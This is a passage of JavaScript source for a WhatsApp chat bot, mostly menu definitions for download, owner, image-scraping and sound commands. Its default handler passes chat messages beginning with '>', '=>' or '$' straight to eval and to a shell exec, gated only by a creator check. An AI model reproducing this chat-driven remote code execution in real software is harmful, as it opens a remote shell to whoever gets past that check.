showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'downloadmenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
*[ 🌷 ] Download Menu* 
pinterestdl [url]
mediafire [url]`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'ownermenu': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ OWNER MENU ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢react [emoji]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢chat [option]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢join [link]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢leave
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢block @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢unblock @user
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bcText [text]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢setexif
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ban add
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢ping
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢owner
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢creator
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢delete
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢infochat
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢quoted
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cowner add 628xx
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listpc
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listgc
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢listonline
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢speedtest
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
case 'scraperimage': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ SCRAPE IMAGE ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢coffe
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢quotesanime
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢couple
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wibu
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢loli
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢pat
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢killnom
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢poke
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wink
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢bonk
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢glomp
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smug
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢blush
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢wave
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢smile
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢highfive
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢cringe
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢dance
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢happy
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢handhold
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢darkjoke
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢meme
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢meme2
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍°͢`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break
//=================================================//
/*
case 'randomsound': {
if (isBan) throw sticBanLu(from)
jansen.sendMessage(m.chat, { image: kalimage, caption: `
┏━━•[ Sound Menu ]
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound1
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound2
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound3
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound4
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound5
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound6
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound7
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound8
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound9
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound10
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound11
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound12
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound13
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound14
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound15
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound16
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound17
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound18
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound19
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound20
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound21
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound22
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound23
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound24
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound25
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound26
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound27
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound28
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound29
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound30
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound31
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound32
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound33
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound34
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound35
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound36
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound37
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound38
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound39
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound40
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound41
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound42
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound43
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound44
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound45
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound46
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound47
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound48
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound49
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound50
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound51
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound52
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound53
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound54
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound55
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound56
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound57
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound58
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound59
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound60
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound61
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound62
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound63
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound64
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound65
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound66
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound67
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound68
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound69
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound70
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound71
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound72
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound73
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound74
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound75
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound76
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound77
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound78
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound79
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound80
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound81
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound82
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound83
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound84
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound85
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound86
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound87
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound88
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound89
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound90
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound91
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound92
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound93
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound94
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound95
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound96
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound97
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound98
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound99
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound100
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound101
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound102
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound103
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound104
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound105
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound106
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound107
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound108
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound109
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound110
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound111
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound112
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound113
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound114
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound115
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound116
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound117
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound118
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound119
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound120
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound121
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound122
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound123
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound124
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound125
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound126
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound127
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound128
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound129
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound130
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound131
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound132
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound133
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound134
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound135
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound136
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound137
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound138
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound139
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound140
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound141
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound142
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound143
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound144
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound145
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound146
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound147
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound148
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound149
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound150
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound151
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound152
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound153
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound154
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound155
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound156
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound157
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound158
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound159
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound160
┃╼⃟݊⃟̥⃝̇݊݊⃟❍➢jansensound161
┗━╼⃟݊⃟̥⃝̇݊݊⃟ ✯𝐉𝐀𝐍𝐒𝐄𝐍✯𝐁𝐎𝐓✯ ݊⃟̥⃝̇݊⃟╾━•`,
contextInfo:{"externalAdReply": {"title": `❍ 𝐉𝚫𝐍𝐒𝚵𝐍 𝐌Ṏ𝐃𝐒 ❍`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/@jansenmods`,
thumbnailUrl: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg', 
}
}}, { quoted:m})
}
break*/
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
jansen.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})